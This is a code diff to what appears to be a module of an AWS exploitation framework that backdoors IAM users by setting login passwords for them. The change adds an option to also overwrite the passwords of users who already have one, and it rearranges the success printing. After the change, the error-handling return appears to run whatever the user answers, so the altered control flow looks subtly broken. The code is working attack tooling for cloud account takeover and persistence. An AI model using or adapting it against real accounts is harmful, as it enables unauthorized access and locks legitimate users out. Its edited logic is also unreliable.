@@ -63,7 +63,7 @@ def main(args, pacu_main):
             print('  SUB-MODULE EXECUTION FAILED')
             return
         for user in session.IAM['Users']:
-            if 'PasswordLastUsed' not in user:
+            if 'PasswordLastUsed' not in user or args.update:
                 users.append(user['UserName'])
     try:
         password_policy = client.get_account_password_policy()
@@ -93,14 +93,11 @@ def main(args, pacu_main):
             print('  User: {}'.format(user))
 
         password = create_valid_password(password_policy)
-        print('  Password: {}'.format(password))
         try:
             caller(
                 UserName=user,
                 Password=password,
                 PasswordResetRequired=False)
-            print('    Password successfully changed')
-            summary_data['backdoored_password_count'] += 1
         except ClientError as error:
             code = error.response['Error']['Code']
             if code == 'AccessDenied':
@@ -112,7 +109,10 @@ def main(args, pacu_main):
             quit = input('    Continue? (y/n) ')
             if quit.lower() != 'y':
                 print('    Exiting...')
-                return summary_data
+            return summary_data        
+        print('    Password successfully changed')
+        print('    Password: {}'.format(password))
+        summary_data['backdoored_password_count'] += 1
     print('{} completed.\n'.format(module_info['name']))
     return summary_data
 
